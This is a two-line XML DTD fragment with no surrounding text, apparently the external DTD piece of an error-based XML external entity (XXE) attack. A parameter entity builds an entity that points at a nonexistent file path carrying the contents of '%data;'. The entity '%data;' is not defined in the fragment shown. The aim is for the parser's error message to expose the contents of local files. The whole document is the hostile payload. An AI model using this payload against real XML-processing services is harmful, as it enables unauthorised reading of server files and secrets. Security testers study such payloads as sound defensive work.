<!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%data;'>">
%eval;